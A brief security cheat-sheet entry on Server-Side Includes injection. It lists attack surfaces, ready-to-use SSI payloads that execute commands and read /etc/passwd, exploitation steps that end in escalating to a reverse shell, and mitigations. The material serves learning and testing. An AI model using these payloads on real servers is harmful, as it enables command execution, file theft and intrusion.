High Severity

📌 Server‑Side Includes (SSI) Injection

🧠 Description

SSI injection occurs when user input is embedded into an SSI directive without sanitisation. Attackers can execute arbitrary system commands, read files, or include remote content.

🎯 Attack Surface

  • ✅ HTTP headers (User‑Agent, Referer)
  • ✅ URL parameters
  • ✅ Form fields that are later used in .shtml pages

💣 Basic Payloads

<!--#exec cmd="id" -->
<!--#include file="/etc/passwd" -->
<!--#include virtual="/admin/index.html" -->
<!--#set var="name" value="hacked" -->

⚙️ Exploitation

  1. Find a parameter reflected in a .shtml page.
  2. Inject <!--#exec cmd="id" -->.
  3. If command output appears, escalate to reverse shell.

🛡️ Mitigation

✅ Disable SSI entirely if not needed
✅ Escape angle brackets and SSI directives
✅ Use allowlist for allowed input
